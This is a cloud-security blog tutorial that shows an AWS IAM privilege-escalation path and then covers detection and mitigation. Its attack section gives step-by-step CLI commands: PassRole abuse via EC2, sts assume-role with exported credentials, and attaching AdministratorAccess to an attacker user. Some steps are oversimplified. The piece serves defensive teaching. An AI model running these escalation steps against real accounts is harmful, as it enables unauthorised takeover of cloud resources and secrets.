
````markdown
---
title: "AWS IAM Misconfiguration → Privilege Escalation (Realistic Attack Path)"
date: 2026-03-27 18:00:00 +0530
categories: [Cloud Security, AWS]
tags: [iam, privilege-escalation, aws, cloud-security, pentesting]
---

## 🧠 Overview

Misconfigured IAM permissions are one of the most common and dangerous cloud security issues.

In this blog, we simulate a real-world scenario where an attacker:
- Starts with limited IAM permissions
- Discovers misconfigurations
- Escalates privileges to admin level

---

## 🎯 Scenario

You have access to AWS with a low-privileged IAM user:

```bash
aws configure
````

Permissions:

* `iam:ListUsers`
* `iam:ListRoles`
* `iam:ListPolicies`

At first glance → harmless.

---

## 🔍 Step 1: Enumeration

List users:

```bash
aws iam list-users
```

List roles:

```bash
aws iam list-roles
```

List policies:

```bash
aws iam list-policies --scope Local
```

---

## ⚠️ Step 2: Identify Misconfiguration

Check attached policies:

```bash
aws iam list-attached-user-policies --user-name target-user
```

Look for:

* `iam:PassRole`
* `sts:AssumeRole`
* `AdministratorAccess`

---

## 🚨 Step 3: Exploitation Path

### Case: `iam:PassRole` Abuse

If user can pass a role to a service:

```bash
aws ec2 run-instances \
  --image-id ami-xxxx \
  --iam-instance-profile Name=AdminRole
```

👉 Launch EC2 with higher privilege role

---

### Case: `sts:AssumeRole`

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name attacker-session
```

Export credentials:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

👉 You now have elevated access

---

## 🧩 Step 4: Post-Exploitation

With elevated privileges:

* Dump S3 buckets:

```bash
aws s3 ls
```

* Access secrets:

```bash
aws secretsmanager list-secrets
```

* Modify IAM:

```bash
aws iam attach-user-policy \
  --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

## 🛡️ Detection

Look for:

* Unusual `AssumeRole` events
* New EC2 instances with privileged roles
* IAM policy changes

Use:

* CloudTrail logs
* GuardDuty alerts

---

## 🔒 Mitigation

### 1. Least Privilege

* Avoid wildcard permissions (`*`)
* Grant only required actions

### 2. Restrict `PassRole`

* Use condition keys:

```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "ec2.amazonaws.com"
  }
}
```

### 3. Monitor STS Usage

* Alert on unusual role assumptions

### 4. Use SCPs (Organizations)

* Block privilege escalation paths

---

## 💡 Key Takeaways

* Small IAM permissions ≠ safe
* `PassRole` and `AssumeRole` are high-risk
* Always audit IAM policies

---

## 🚀 Conclusion

Cloud security is not just about configuration — it's about understanding how attackers chain permissions.

If you can think like an attacker, you can defend like an engineer.

---

## 📚 References

* AWS IAM Documentation
* MITRE ATT&CK (Cloud Matrix)

```
